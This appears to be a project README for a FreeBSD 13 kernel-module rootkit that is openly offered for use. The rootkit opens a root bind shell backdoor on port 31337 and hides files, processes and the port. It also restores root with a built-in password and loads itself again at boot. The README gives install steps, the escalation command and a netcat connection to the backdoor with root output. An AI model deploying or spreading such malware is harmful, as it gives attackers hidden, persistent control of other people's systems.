<h2>BDS KLD ROOTKIT</h2>
<p>
Freebsd KLD Rootkit for FreeBSD 13. Hide files, hide process, hide port, bind shell backdoor
<br>
Developed by : Antonius
<br>
Website : www.bluedragonsec.com
<br>
Github : https://github.com/bluedragonsecurity
<br>
https://twitter.com/bluedragonsec
</p>

<p>
<h3>Features</h3>
<ul>
  <li>Bind shell on port 31337</li>
  <li>Bind shell process hiding</li>
  <li>Hide file with prefix bds</li>
  <li>Hide bind shell port</li>
  <li>Privilege escalation with password</li>
</ul>
</p>

<p>
<h3>Installation</h3>
<br>
You need root privilege, make and gcc to install this rootkit. To install just type :
<pre>
./install.sh
</pre>
</p>

<h3>Using the Rootkit</h3>
<p>
<b>Privilege Escalation</b>
<br>
  Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing :
  <pre>
  /sbin/bds_shell bluedragonsec
  </pre>
Typing above command will make you regain root privilege : 
<br>
<pre>
robotsoft@robotsoft ~> id
uid=1002(robotsoft) gid=1002(robotsoft) groups=1002(robotsoft),0(wheel),5(operator)
robotsoft@robotsoft ~> /sbin/bds_shell bluedragonsec
root@robotsoft:~ # id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
root@robotsoft:~ # 
</pre>
</p>

<p>
<b>Connecting to Bind Shell Backdoor</b>
<br>  
Connecting to bind shell on a freebsd server which you have installed this rootkit can be accomplished simply by using netcat :
<pre>
nc (server ip) 31337
</pre>
For example, freebsd server with rootkit installed is at 192.168.0.141 : 
<pre>
root@robotsoft ~# nc 192.168.0.141 31337
FreeBSD robotsoft 13.2-STABLE FreeBSD 13.2-STABLE GENERIC amd64
sh: turning off NDELAY mode
id
uid=0(root) gid=0(wheel) groups=0(wheel)
pwd
/
</pre>
</p>

<p>
<b>Hiding Files and Directories
</b>
<br>
  To hide file and directory just give prefix bds to file name and directory name
</p>

<p>
<b>Process Hiding</b>
This rootkit hides bind shell process from ps.
</p>

<p>
<b>Port Hiding</b>
<br>
This rootkit hides bind shell port from netstat.
</p>

<p>
<b>Persistence</b>
<br>
The rootkit is activated every time the system starts up. After the reboot, wait for 1 minute, the rootkit will be loaded into kernel.
</p>
